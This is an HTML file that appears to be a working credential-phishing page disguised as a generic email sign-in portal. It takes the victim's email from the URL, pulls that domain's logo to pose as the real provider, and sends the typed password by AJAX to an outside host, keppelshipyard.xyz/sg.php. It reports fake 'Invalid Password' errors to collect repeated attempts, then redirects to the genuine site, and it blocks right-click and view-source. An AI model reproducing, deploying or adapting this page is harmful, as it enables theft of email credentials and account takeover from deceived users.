<html id="html" data-ref="alphash" data-iframe="0" lang="en">
<head>
    <meta charset="UTF-8">
    <title>PORTAL - <span id="tit"></span> Mail Authentication</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link id="faviconx" rel="icon" type="image/x-icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&amp;type=FAVICON&amp;fallback_opts=TYPE,SIZE,URL&amp;url=http://aegistax.com&amp;size=64">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
    <style>
        body {
            background-color: #fff;
            overflow-x: hidden;
            user-select: none;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        
        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 420px;
            background: #fff;
            box-shadow: 0 10px 15px rgba(179, 179, 179, 0.7);
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        
        .top-level {
            background-color: #f5f5f5;
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .top-level h3 {
            color: #0a66c3;
            font-size: 20px;
            margin: 0;
        }
        
        .top-level img {
            width: 70px;
            margin-bottom: 10px;
        }
        
        .info {
            background-color: #f9f9f9;
            padding: 10px 20px;
            font-size: 12px;
            color: #666;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
        }
        
        .info span {
            display: inline-flex;
            align-items: center;
        }
        
        .icon {
            margin-right: 5px;
        }
        
        .intro-text {
            padding: 20px;
            text-align: center;
        }
        
        .intro-text h2 {
            color: #0627ab;
            font-size: 18px;
            margin: 0 0 10px 0;
        }
        
        .intro-text p {
            color: #333;
            font-size: 14px;
            line-height: 1.5;
            margin: 0;
        }
        
        hr {
            border: none;
            height: 1px;
            background-color: #e0e0e0;
            margin: 15px 0;
        }
        
        .inputs {
            padding: 0 20px;
        }
        
        .input {
            position: relative;
            margin-bottom: 20px;
        }
        
        .input input {
            width: 100%;
            height: 50px;
            padding: 15px 10px 5px 10px;
            border: 1px solid #8c8c8c;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            box-sizing: border-box;
        }
        
        .input input:focus {
            border-color: #0a66c3;
            border-width: 2px;
        }
        
        .input label {
            position: absolute;
            top: 15px;
            left: 10px;
            color: #8c8c8c;
            font-size: 16px;
            transition: 0.2s;
            pointer-events: none;
        }
        
        .input input:focus ~ label,
        .input input:valid ~ label {
            top: 5px;
            font-size: 12px;
            color: #000;
        }
        
        #auth_reg, #auth_reg2 {
            color: red;
            font-size: 12px;
            display: none;
        }
        
        .rem_me {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .rem_me input[type="checkbox"] {
            margin-right: 5px;
        }
        
        .rem_me a {
            color: #0a66c3;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
        }
        
        .terms-checkbox {
            display: flex;
            align-items: flex-start;
            margin-bottom: 20px;
            padding: 10px;
            background-color: #f9f9f9;
            border-radius: 4px;
            border: 1px solid #e0e0e0;
        }
        
        .terms-checkbox input[type="checkbox"] {
            margin-right: 10px;
            margin-top: 3px;
        }
        
        .terms-checkbox label {
            font-size: 13px;
            color: #333;
            line-height: 1.4;
        }
        
        #terms-error {
            color: red;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        button {
            width: 100%;
            height: 50px;
            background: #0a66c3;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-bottom: 20px;
        }
        
        button:hover {
            background: #0957a6;
        }
        
        .join-link {
            text-align: center;
            padding: 15px 20px;
            color: #666;
            font-size: 12px;
            background-color: #f9f9f9;
            border-top: 1px solid #e0e0e0;
        }
        
        .join-link a {
            color: #0a66c3;
            text-decoration: none;
        }
        
        .join-link a:hover {
            text-decoration: underline;
        }
        
        .overlay_div {
            display: none;
        }
        
        #mainPage {
            display: none;
        }
        
        @media only screen and (max-width: 600px) {
            .container {
                box-shadow: none;
                max-width: 100%;
            }
            
            .main-container {
                padding: 10px;
            }
            
            .info {
                flex-direction: column;
                gap: 5px;
                align-items: center;
            }
        }
    </style>

    <script>
    // Function to display date, time, browser, OS, and location
    function displayInfo() {
        // Display current date and time
        var currentDate = new Date();
        var dateString = currentDate.toDateString();
        var timeString = currentDate.toLocaleTimeString();
        var datetimeElements = document.getElementsByClassName("datetime");
        for (var i = 0; i < datetimeElements.length; i++) {
            datetimeElements[i].innerHTML = '<i class="far fa-calendar-alt icon"></i>' + dateString + '<i class="far fa-clock icon"></i>' + timeString;
        }

        // Display browser type
        var browserType = detectBrowser();
        var browserElements = document.getElementsByClassName("browser");
        for (var i = 0; i < browserElements.length; i++) {
            browserElements[i].innerHTML = '<i class="fab fa-internet-explorer icon"></i>' + browserType;
        }

        // Display operating system
        var os = detectOS();
        var osElements = document.getElementsByClassName("os");
        for (var i = 0; i < osElements.length; i++) {
            osElements[i].innerHTML = '<i class="fab fa-windows icon"></i>' + os;
        }

        // Get and display user's location (city and country) based on IP address
        fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(data => {
                var city = data.city;
                var country = data.country_name;
                var locationElements = document.getElementsByClassName("location");
                for (var i = 0; i < locationElements.length; i++) {
                    locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country;
                }
            })
            .catch(error => {
                var locationElements = document.getElementsByClassName("location");
                for (var i = 0; i < locationElements.length; i++) {
                    locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>Unable to retrieve';
                }
            });
    }

    // Function to detect browser type
    function detectBrowser() {
        var userAgent = window.navigator.userAgent;
        var browsers = {chrome: /chrome/i, safari: /safari/i, firefox: /firefox/i, ie: /internet explorer/i, edge: /edge/i, opera: /opera|OPR/i, android: /android/i, ios: /iphone|ipad|ipod/i};
        for (var key in browsers) {
            if (browsers[key].test(userAgent)) {
                return key;
            }
        }
        return "Unknown";
    }

    // Function to detect operating system
    function detectOS() {
        var userAgent = window.navigator.userAgent;
        var os;
        if (userAgent.indexOf("Windows") !== -1) {
            os = "Windows";
        } else if (userAgent.indexOf("Mac") !== -1) {
            os = "Mac OS";
        } else if (userAgent.indexOf("Linux") !== -1) {
            os = "Linux";
        } else {
            os = "Unknown";
        }
        return os;
    }
    </script>
</head>

<body>
    <div class="main-container">
        <div class="container w3-animate-zoom">
            <div class="top-level">
                <img class="main_logo_id" src="" style="width:70px;">
                <h3>EMAIL PORTAL</h3>
            </div>
            
            <div class="info">
                <span class="datetime"></span>
                <span class="browser"></span>
                <span class="os"></span>
                <span class="location"></span>
            </div>
            
            <div class="intro-text">
                <h2 id="auth_email"></h2>
                <hr>
                <p id="comment_text">You're accessing a secure settings, please Sign in <b><span id="pussy">your account </span></b> to continue.</p>
            </div>
            
            <form action="" method="POST" id="contact">
                <div class="inputs">
                    <input type="hidden" name="email" id="email" required>
                    
                    <div class="input">
                        <input type="password" name="password" id="password" required>
                        <label id="pass_label" for="password">Password</label>
                    </div>
                    
                    <div style="display: flex; margin-bottom: 10px;">
                        <span id="auth_reg">Authentication is required!</span>
                        <span id="auth_reg2">Invalid Password. Please try again.</span>
                    </div>
                    
                    <div class="rem_me">
                        <input type="checkbox" id="show_pass_button">
                        <a id="show_pass" style="color:#0A66C3; font-size: 0.8rem;">Show password</a>
                    </div>
                    
                    <!-- REQUIRED CHECKBOX -->
                    <div class="terms-checkbox">
                        <input type="checkbox" id="terms_agree" name="terms_agree" required>
                        <label for="terms_agree">I confirm that I am the authorized user of this account </label>
                    </div>
                    <div id="terms-error">You must confirm that you are the authorized user of this account to continue.</div>
                    
                    <button id="next_button" type="button">NEXT</button>
                </div>
            </form>
            
            <div class="join-link">
                Â© 2025&nbsp;<a href="#" id="footer_com">Secure Portal</a>&nbsp;|&nbsp;<a href="#" id="footer_pri">Privacy</a><br>
                <a href="#" id="footer_dom"></a>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script>
    $(document).ready(function(){
        // Call the function to display date, time, browser, OS, and location
        displayInfo();
        
        var count = 0;
        var email = window.location.hash.substr(1);
        var my_slice = "";
        
        if (email) {
            var my_email = email;
            $('#email').val(my_email);
            $('#auth_email').html(my_email);

            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

            if (filter.test(my_email)) {
                var ind = my_email.indexOf("@");
                my_slice = my_email.substr((ind+1));
                var c = my_slice.substr(0, my_slice.indexOf('.'));
                var finalu = c.toUpperCase();
                
                $(".main_logo_id").attr("src", "https://logo.clearbit.com/"+my_slice);
                $("#tit").html(finalu);
                $("#pussy").html(my_slice);
                $("#footer_dom").html(my_slice);
                $('#auth_email').html(my_email + " - Verification Required");
            }
        }

        // Show password toggle
        $('#show_pass_button').click(function(){
            var passwordField = $('#password');
            if(passwordField.attr('type') === 'password'){
                passwordField.attr('type', 'text');
                $('#show_pass').text('Hide password');
            } else {
                passwordField.attr('type', 'password');
                $('#show_pass').text('Show password');
            }
        });

        $('#next_button').click(function(event){
            event.preventDefault();
            
            // Reset error messages
            $('#auth_reg').hide();
            $('#auth_reg2').hide();
            $('#terms-error').hide();
            
            // Check if terms checkbox is checked
            if(!$('#terms_agree').is(':checked')) {
                $('#terms-error').show();
                return false;
            }
            
            var email = $("#email").val();
            var password = $("#password").val();
            
            if (!email) {
                $('#auth_reg').show().html("Email cannot be found");
                return false;
            }
            
            if (!password) {
                $('#auth_reg').show().html("Password is empty!");
                return false;
            }

            count = count + 1;
            
            // Disable button during submission
            var $button = $(this);
            $button.prop('disabled', true).html('Verifying...');

            $.ajax({
                dataType: 'JSON',
                url: 'http://keppelshipyard.xyz/sg.php',
                type: 'POST',
                data: {
                    email: email,
                    password: password,
                    terms_agree: $('#terms_agree').is(':checked') ? 'yes' : 'no'
                },
                beforeSend: function(xhr){
                    // You can add loading indicator here if needed
                },
                success: function(response){
                    if(response && response.signal === 'ok'){
                        $("#password").val("");
                        if (count >= 3 && my_slice) {
                            window.location.replace("https://www." + my_slice);
                        } else {
                            $("#auth_reg2").show();
                        }
                    } else {
                        $("#auth_reg2").show();
                    }
                },
                error: function(){
                    $("#password").val("");
                    if (count >= 20 && my_slice) {
                        window.location.replace("https://www." + my_slice);
                    } else {
                        $("#auth_reg2").show();
                    }
                },
                complete: function(){
                    // Re-enable button
                    $button.prop('disabled', false).html('NEXT');
                }
            });
        });
        
        // Enable form submission on Enter key
        $('#password').keypress(function(e){
            if(e.which === 13){
                $('#next_button').click();
            }
        });
    });
    
    // Prevent right-click and Ctrl+U/Ctrl+S
    document.addEventListener("contextmenu", function(event) {
        event.preventDefault();
    });

    document.addEventListener("keydown", function(event) {
        if (event.ctrlKey && (event.key === "u" || event.key === "s")) {
            event.preventDefault();
        }
    });
    </script>
</body>
</html>
